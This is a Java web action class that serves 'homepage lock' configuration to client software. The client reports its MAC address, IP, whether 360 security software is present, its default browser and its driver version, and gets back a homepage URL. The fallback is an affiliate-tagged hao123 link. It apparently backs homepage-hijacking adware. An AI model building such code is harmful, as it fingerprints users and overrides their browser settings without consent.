package com.sltunion.cloudy.web.action.interfaces;

import javax.annotation.Resource;

import com.sltunion.cloudy.common.utils.ObjectUtil;
import com.sltunion.cloudy.common.utils.XmlParseUtil;
import com.sltunion.cloudy.service.HomepagelockService;
import com.sltunion.cloudy.service.IAUService;
import com.sltunion.cloudy.vo.xml.HomePageXml;
import com.sltunion.cloudy.web.action.BaseAction;

/**
 * 
 * @author sundial
 * 
 */
public class HomepagelockAction extends BaseAction {

	private static final long serialVersionUID = -3893636054040150335L;
	private String ci;
	private String ma;
	private String ip;
	private Integer i3;
	private String db;
	private String id;
	private String sn;
	private Integer sv;
	private String dn;
	private String debug;

	private String result;

	@Resource
	private HomepagelockService homepagelockService;
	@Resource
	protected IAUService iauService;

	public String pullhomepageurl() {
		long start = System.currentTimeMillis();
		ip = getIPAddr();
		Long channelid = 1l;// 渠道
		if (ObjectUtil.isNotEmpty(ci)) {
			try {
				// 渠道处理
				ci = ci.split("\\D")[0];
				channelid = Long.valueOf(ci);
			} catch (Exception e) {
				channelid = 1l;
			}
		}
		try {
			result = homepagelockService
					.pullDriverXml(channelid, dn,ma, ip, i3, db, id, sn, sv, debug);
		} catch (Exception e) {
			logger.error("", e);
			HomePageXml driverPageXml = new HomePageXml();
			driverPageXml.setFlag(1);
			driverPageXml.setUrl("http://www.hao123.com/?tn=98904302_hao_pg");
			driverPageXml.setLockerBigJsFlag(0);
			driverPageXml.setLockerBigJsUrl("0");
			driverPageXml.setLockerBigSafeFlag(0);
			driverPageXml.setLockerBigSafeUrl("0");
			result = XmlParseUtil.marshal(driverPageXml, HomePageXml.class);
		}
		logger.info("取驱动主页[渠道id:" + ci + ",ip:" + ip + ",is360:" + i3 + ",defaultbrowser:" + db
				+ ",安装日期:" + id + ",驱动版本号:" + sn + ",系统版本:" + sv + ",耗时："
				+ (System.currentTimeMillis() - start) + "ms]");
		return SUCCESS;
	}

	public String getCi() {
		return ci;
	}

	public void setCi(String ci) {
		this.ci = ci;
	}

	public String getMa() {
		return ma;
	}

	public void setMa(String ma) {
		this.ma = ma;
	}

	public String getIp() {
		return ip;
	}

	public void setIp(String ip) {
		this.ip = ip;
	}

	public Integer getI3() {
		return i3;
	}

	public void setI3(Integer i3) {
		this.i3 = i3;
	}

	public String getDb() {
		return db;
	}

	public void setDb(String db) {
		this.db = db;
	}

	public String getId() {
		return id;
	}

	public void setId(String id) {
		this.id = id;
	}

	public String getSn() {
		return sn;
	}

	public void setSn(String sn) {
		this.sn = sn;
	}

	public Integer getSv() {
		return sv;
	}

	public void setSv(Integer sv) {
		this.sv = sv;
	}

	public void setDn(String dn) {
		this.dn = dn;
	}

	public String getDn() {
		return dn;
	}

	public void setDebug(String debug) {
		this.debug = debug;
	}

	public String getDebug() {
		return debug;
	}

	public String getResult() {
		return result;
	}

	public void setResult(String result) {
		this.result = result;
	}
}
